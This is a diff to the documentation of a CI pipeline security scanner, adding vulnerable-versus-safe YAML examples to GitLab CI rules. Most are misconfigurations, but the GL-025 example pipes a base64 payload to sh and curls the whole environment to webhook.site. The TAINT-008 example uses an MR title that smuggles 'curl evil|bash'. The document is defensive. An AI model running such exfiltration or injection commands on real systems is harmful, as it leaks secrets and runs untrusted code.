@@ -8710,6 +8710,27 @@ Fires once per offending IaC file with a finding location pointing at the file. 
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``image: node:20`` is a mutable tag. Docker
+# Hub's node team rebuilds it on every Node point
+# release; a publisher takeover ships code into every
+# GitLab pipeline using the tag.
+build:
+  image: node:20
+  script:
+    - npm ci
+    - npm test
+
+# Safe: pin to the content-addressable digest.
+build:
+  image: node@sha256:abc123...   # node:20.11.1
+  script:
+    - npm ci
+    - npm test
+```
+
 **Source:** [`GL-001`](../providers/gitlab.md#gl-001) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-002`: Script injection via untrusted commit/MR context <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-002 }
@@ -8755,6 +8776,29 @@ build:
 
 **Recommendation.** Store credentials as protected + masked CI/CD variables in project or group settings, and reference them by name from the YAML. For cloud access prefer short-lived OIDC tokens.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: literal AWS access key in pipeline-level
+# ``variables:``. The ``.gitlab-ci.yml`` is committed
+# to git, printed in build logs whenever a job echoes
+# its environment, visible to any repo reader.
+variables:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+  AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+deploy:
+  script: [aws s3 cp ./build s3://bucket/]
+
+# Safe: store credentials as protected + masked CI/CD
+# variables in GitLab Settings. The pipeline file
+# references the env names; values resolve at runtime
+# and are masked in logs.
+deploy:
+  script: [aws s3 cp ./build s3://bucket/]
+  # AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY come from
+  # project-level protected + masked CI/CD variables
+```
+
 **Source:** [`GL-003`](../providers/gitlab.md#gl-003) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-004`: Deploy job lacks manual approval or environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-004 }
@@ -8774,6 +8818,29 @@ build:
 **How this is detected.** Cross-project and remote includes can be silently re-pointed. Branch-name refs (`main`/`master`/`develop`/`head`) are treated as unpinned; tag and SHA refs are considered safe.
 
 **Recommendation.** Pin `include: project:` entries with `ref:` set to a tag or commit SHA. Avoid `include: remote:` for untrusted URLs; mirror the content into a trusted project and pin it.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``include:`` pulls a remote project without
+# a pinned ref. ``ref:`` defaults to ``HEAD`` of the
+# default branch; whoever can push to that branch on
+# the templates project ships pipeline code into every
+# consumer.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    # no ref: — resolves to HEAD
+
+# Safe: pin ``ref:`` to a tag (with tag-protect enforced
+# on the templates project) or a 40-char commit SHA.
+# Renovate's gitlabci-include ecosystem updater bumps
+# these in reviewable MRs.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    ref: 0123456789abcdef0123456789abcdef01234567   # v1.4.2
+```
 
 **Source:** [`GL-005`](../providers/gitlab.md#gl-005) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -8810,6 +8877,28 @@ build:
 **Known false positives.**
 
 - Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a credential-shaped literal in a job env
+# / inline script / variables block. Same leak surface
+# as GL-003 plus the additional gap that build-time
+# logs may echo the value.
+deploy:
+  script:
+    - curl -H "Authorization: Bearer ghp_abcdef1234567890abcdef1234567890abcdef12" \
+        https://api.github.com/repos/org/repo/issues
+
+# Safe: route the credential through a protected +
+# masked CI/CD variable. The pipeline body carries the
+# env name, never the value.
+deploy:
+  script:
+    - curl -H "Authorization: Bearer $GITHUB_TOKEN" \
+        https://api.github.com/repos/org/repo/issues
+  # GITHUB_TOKEN configured as protected + masked
+```
 
 **Source:** [`GL-008`](../providers/gitlab.md#gl-008) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -8880,6 +8969,31 @@ deploy:
 
 **Recommendation.** Move the included template into a separate, read-only project and reference it via `include: project: ... ref: <sha-or-tag>`. That way the included content is fixed at MR creation time and not editable from the MR branch.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: the pipeline ``include:``s a local file
+# that any MR can modify, on an MR-triggered pipeline.
+# A merge request can rewrite ``ci/build.yml`` and
+# run its own version of the build with the pipeline's
+# full credential set in scope.
+include:
+  - local: 'ci/build.yml'
+build:
+  extends: .build_steps
+  rules:
+    - if: $CI_PIPELINE_SOURCE == 'merge_request_event'
+
+# Safe: route MR-triggered work through a separate
+# remote-include from a SHA-pinned templates project.
+# An MR can no longer rewrite the build's structure
+# without a separate review on the templates repo.
+include:
+  - project: 'ci/templates'
+    file: '/build.yml'
+    ref: 0123456789abcdef0123456789abcdef01234567
+```
+
 **Source:** [`GL-011`](../providers/gitlab.md#gl-011) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-012`: Cache key derives from MR-controlled CI variable <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-012 }
@@ -8940,6 +9054,28 @@ deploy:
 
 - Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``curl | bash`` install one-liner trusts
+# both the network path and the installer host. A
+# MITM or compromised endpoint ships malicious code
+# into the job's shell.
+install:
+  image: alpine@sha256:abc123...
+  script:
+    - curl -fsSL https://installer.example.com/cli.sh | bash
+
+# Safe: download, verify a sha256 digest from a trusted
+# source, then execute.
+install:
+  image: alpine@sha256:abc123...
+  script:
+    - curl -fsSL https://installer.example.com/cli.sh -o /tmp/cli.sh
+    - echo 'a1b2c3d4...  /tmp/cli.sh' | sha256sum -c -
+    - bash /tmp/cli.sh
+```
+
 **Source:** [`GL-016`](../providers/gitlab.md#gl-016) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-017`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-017 }
@@ -8952,6 +9088,31 @@ deploy:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``docker run --privileged`` plus the host
+# Docker socket inside a GitLab Runner job gives the
+# container full kernel access. A compromise escapes
+# to the runner host and from there to every other job
+# sharing it.
+integration:
+  image: docker:24
+  services: [docker:24-dind]
+  script:
+    - docker run --privileged \
+        -v /var/run/docker.sock:/var/run/docker.sock \
+        myapp:test ./integration.sh
+
+# Safe: drop ``--privileged`` and the socket mount. If
+# the job needs to build images, use Kaniko / BuildKit
+# rootless. Run integration tests in a normal container.
+integration:
+  image: myapp@sha256:abc123...
+  script:
+    - ./integration.sh
+```
+
 **Source:** [`GL-017`](../providers/gitlab.md#gl-017) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-018`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-gl-018 }
@@ -8963,6 +9124,26 @@ deploy:
 **Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: pip uses a plaintext-HTTP index and
+# ``--trusted-host`` silences hash verification.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url http://internal-pypi.example.com/simple
+        --trusted-host internal-pypi.example.com -r requirements.txt
+
+# Safe: HTTPS + ``--require-hashes``. Internal CA
+# installed into the image's trust store.
+install:
+  image: python@sha256:abc123...
+  script:
+    - pip install --index-url https://internal-pypi.example.com/simple
+        --require-hashes -r requirements.txt
+```
 
 **Source:** [`GL-018`](../providers/gitlab.md#gl-018) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -9042,6 +9223,30 @@ package:
 
 **Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``npm config set strict-ssl false`` (or
+# ``git config http.sslverify false`` /
+# ``NODE_TLS_REJECT_UNAUTHORIZED=0``) disables TLS for
+# the rest of the job. A MITM swaps the registry's
+# tarballs in flight.
+install:
+  image: node@sha256:abc123...
+  script:
+    - npm config set strict-ssl false
+    - npm install
+
+# Safe: install the missing CA into the image trust
+# store; keep strict-ssl on.
+install:
+  image: node@sha256:abc123...
+  script:
+    - cp /etc/ssl/internal-ca.crt /usr/local/share/ca-certificates/
+    - update-ca-certificates
+    - npm install
+```
+
 **Source:** [`GL-023`](../providers/gitlab.md#gl-023) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-024 }
@@ -9067,6 +9272,25 @@ package:
 - Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
 - Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: a job body executes a base64-decoded
+# payload, exfils to ``webhook.site``, or runs a known
+# miner binary. A malicious MR (or a compromised co-
+# maintainer) lands the payload in the CI file; every
+# subsequent run executes it.
+build:
+  script:
+    - echo Z2g6Li4uIA== | base64 -d | sh
+    - curl https://webhook.site/abc?env=$(env|base64)
+
+# Safe: the pipeline does only what the pipeline does.
+# If a check fires here, treat as incident response.
+build:
+  script: [make build]
+```
+
 **Source:** [`GL-025`](../providers/gitlab.md#gl-025) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-026 }
@@ -9080,6 +9304,26 @@ package:
 **Known false positives.**
 
 - ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``eval`` on a CI variable or extends'd
+# input gives that value full shell-grammar reach.
+# A run-pipeline variable carrying metacharacters
+# executes them.
+deploy:
+  script:
+    - eval "$DEPLOY_CMD"
+    - sh -c $RAW_HOOK
+
+# Safe: invoke a script you own with the value as a
+# quoted argument; let the script validate against an
+# allow-list. Never eval values from CI variables.
+deploy:
+  script:
+    - ./scripts/dispatch.sh "$DEPLOY_CMD"
+```
 
 **Source:** [`GL-026`](../providers/gitlab.md#gl-026) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -9101,6 +9345,29 @@ package:
 
 **Recommendation.** Pin every ``services:`` entry the same way ``image:`` is pinned, prefer ``@sha256:<digest>``, or at minimum a full immutable version tag (``postgres:16.2-alpine``). Avoid ``:latest`` and bare tags like ``:16``.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``services:`` references mutable image
+# tags. A publisher repoint (or namespace takeover) on
+# the services image swaps the code that runs alongside
+# every job using the service.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres:15
+    - redis:7
+  script: [pytest]
+
+# Safe: pin every services image to its digest.
+integration:
+  image: app@sha256:abc123...
+  services:
+    - postgres@sha256:def456...   # postgres:15.4
+    - redis@sha256:fed987...      # redis:7.2.4
+  script: [pytest]
+```
+
 **Source:** [`GL-028`](../providers/gitlab.md#gl-028) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-029`: Manual deploy job defaults to allow_failure: true <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-gl-029 }
@@ -9121,6 +9388,32 @@ package:
 
 **Recommendation.** Pin ``trigger: include: project:`` entries with ``ref:`` set to a tag or commit SHA. Avoid ``trigger: include: remote:`` for untrusted URLs; mirror the content into a trusted project and pin it there.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: ``trigger:`` ``include:`` pulls a child
+# pipeline definition from a remote project without
+# pinning the ref. Whoever can push to that project's
+# default branch ships child-pipeline content into the
+# parent's run.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        # no ref:
+
+# Safe: pin ``ref:`` to a SHA or protected tag.
+deploy:
+  stage: deploy
+  trigger:
+    include:
+      - project: 'ci/templates'
+        file: '/child-pipeline.yml'
+        ref: 0123456789abcdef0123456789abcdef01234567
+```
+
 **Source:** [`GL-030`](../providers/gitlab.md#gl-030) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `GL-031`: id_tokens: missing audience pin or environment binding <span class="pg-sev pg-sev--high">HIGH</span> { #detail-gl-031 }
@@ -9130,6 +9423,33 @@ package:
 **How this is detected.** Pairs with IAM-008. IAM-008 verifies the cloud-side trust policy pins audience + subject; this rule verifies the GitLab-side workflow can't request a token without an audience claim or without a deployment gate.
 
 **Recommendation.** For every job that declares an ``id_tokens:`` block, pin a non-wildcard ``aud:`` (a literal string the consumer trusts) AND bind the job to a protected ``environment:``. Audience pinning prevents token replay against unintended consumers; the environment binding gates which refs can drive the assume-role on the consumer side.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``id_tokens:`` mints a JWT with no
+# ``aud:`` pin and no environment binding. The token's
+# subject claim accepts any ref / branch, so an MR
+# pipeline can assume the prod IAM role if the cloud
+# trust policy doesn't tighten ``sub`` itself.
+deploy:
+  id_tokens:
+    AWS_TOKEN:
+      # no aud:, no audience pin
+  script: [aws sts assume-role-with-web-identity ...]
+
+# Safe: pin ``aud:`` to an issuer-specific value AND
+# bind the job to a protected environment with manual
+# approval. The cloud-side trust policy ALSO checks
+# ``sub`` against the project + protected-ref shape.
+deploy:
+  environment:
+    name: production   # protected, reviewer-gated
+  id_tokens:
+    AWS_TOKEN:
+      aud: sts.amazonaws.com
+  script: [aws sts assume-role-with-web-identity ...]
+```
 
 **Source:** [`GL-031`](../providers/gitlab.md#gl-031) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -9146,6 +9466,29 @@ package:
 **Known false positives.**
 
 - Workflows that intentionally select runners by environment via a vetted ``variables:`` block (``RUNNER_TAG: deploy-prod``) referencing a build-time-set value are out of scope, the rule only matches the curated untrusted-predefined-variable catalog. Static custom variables (``$DEPLOY_FLEET`` defined inside the workflow file) are intentionally not flagged.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: ``tags:`` interpolates a CI variable. A
+# pusher controls ``$CI_COMMIT_REF_NAME`` (the branch
+# name) and can name their MR branch after a privileged
+# runner tag (e.g. ``shell-runner-prod``). The MR build
+# routes to that runner pool and accesses tokens /
+# secrets meant for protected pipelines only.
+build:
+  tags:
+    - $CI_COMMIT_REF_NAME
+  script: [./deploy.sh]
+
+# Safe: pin runner tags to static literals. Protected
+# runners should additionally be configured as
+# protected-only in GitLab Settings so MR pipelines
+# can't reach them even if the YAML drifts.
+build:
+  tags: [linux-amd64]
+  script: [./deploy.sh]
+```
 
 **Source:** [`GL-032`](../providers/gitlab.md#gl-032) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -9169,6 +9512,32 @@ for direct interpolation of the same attacker-controllable predefined variables 
 **Known false positives.**
 
 - Some self-hosted GitLab installations build a diagnostic banner into the global ``before_script`` that ``echo``s commit metadata for log-correlation purposes. Suppress per pipeline file rather than globally, the rule is checking propagation reach, not intent.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: a global ``before_script:`` (or
+# ``after_script:``) interpolates an untrusted CI
+# variable. The injected metacharacters then execute
+# in every job that inherits the global block, which
+# usually means every job in the pipeline.
+before_script:
+  - echo "Building $CI_COMMIT_MESSAGE"   # message is attacker-controllable
+build:
+  script: [make build]
+test:
+  script: [make test]
+
+# Safe: assign the untrusted source to a local variable
+# and quote on every use. Pulling the value into a
+# variable AT MOST ONCE per job keeps the injection
+# surface to a single quoted reference.
+before_script:
+  - MSG="$CI_COMMIT_MESSAGE"
+  - echo "Building $MSG"
+build:
+  script: [make build]
+```
 
 **Source:** [`GL-033`](../providers/gitlab.md#gl-033) in the [GitLab CI provider](../providers/gitlab.md).
 
@@ -12376,6 +12745,43 @@ v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``inclu
 
 - If the producer job runs a sanitiser between the tainted source interpolation and the dotenv write (``echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 ' > taint.env``), the consumer is no longer exploitable but TAINT-004 still fires. Suppress via ignore-file scoped to the consumer job's pipeline file when this is the deliberate shape; the sanitiser is then load-bearing and any future regression in it would re-expose the consumer.
 
+**Proof of exploit.**
+
+```
+# Vulnerable: an ``extract`` job writes an untrusted
+# source (``$CI_COMMIT_MESSAGE``) into a dotenv report
+# artifact. GitLab automatically loads dotenv reports
+# as env vars in dependent jobs; the consumer job then
+# inlines the value into a shell command unquoted, and
+# any metacharacters in the source execute there.
+extract:
+  script:
+    - echo "MSG=$CI_COMMIT_MESSAGE" > deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env
+use:
+  needs: [extract]
+  script:
+    - ./gen-notes --message $MSG
+
+# Safe: sanitise at the producer before writing the
+# dotenv file, and quote at the consumer. The cleaned
+# value is safe to inline; the consumer's env binding
+# is properly quoted.
+extract:
+  script:
+    - clean=$(echo "$CI_COMMIT_MESSAGE" | tr -dc 'a-zA-Z0-9 -')
+    - echo "MSG=$clean" > deploy.env
+  artifacts:
+    reports:
+      dotenv: deploy.env
+use:
+  needs: [extract]
+  script:
+    - ./gen-notes --message "$MSG"
+```
+
 **Source:** [`TAINT-004`](../providers/gitlab.md#taint-004) in the [GitLab CI provider](../providers/gitlab.md).
 
 ### `TAINT-005`: Untrusted input flows across steps via ``buildkite-agent meta-data`` <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-005 }
@@ -12618,6 +13024,41 @@ v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (wo
 **Known false positives.**
 
 - If the consuming job sanitises the inherited variable before referencing it (``CLEAN=$(echo "$TITLE" | tr -dc 'a-zA-Z0-9 '); echo $CLEAN``), the rule still fires on the original ``$TITLE`` reference even though the sanitised value is what reaches the shell. Suppress via ignore-file scoped to the consuming job's name when the sanitiser is audited and load-bearing.
+
+**Proof of exploit.**
+
+```
+# Vulnerable: hidden template ``.base`` interpolates
+# ``$CI_COMMIT_TITLE`` (attacker-controllable via MR
+# title) into a ``variables:`` block. Job ``build``
+# extends ``.base`` and references ``$TITLE`` unquoted
+# in a shell command. A MR titled ``feat;curl
+# evil|bash;`` executes the injected curl. GL-002
+# misses this because it skips hidden-job templates.
+.base:
+  variables:
+    TITLE: $CI_COMMIT_TITLE
+build:
+  extends: .base
+  script:
+    - echo Building $TITLE
+    - ./generate-notes --title $TITLE
+
+# Safe: receive the source value at the consumer (not
+# the template), sanitise it once, and reference the
+# cleaned variable quoted from then on. The hidden
+# template no longer carries any attacker-controllable
+# variable.
+.base:
+  before_script:
+    - echo "Job $CI_JOB_NAME starting"
+build:
+  extends: .base
+  script:
+    - clean=$(echo "$CI_COMMIT_TITLE" | tr -dc 'a-zA-Z0-9 -')
+    - echo "Building $clean"
+    - ./generate-notes --title "$clean"
+```
 
 **Source:** [`TAINT-008`](../providers/gitlab.md#taint-008) in the [GitLab CI provider](../providers/gitlab.md).
 
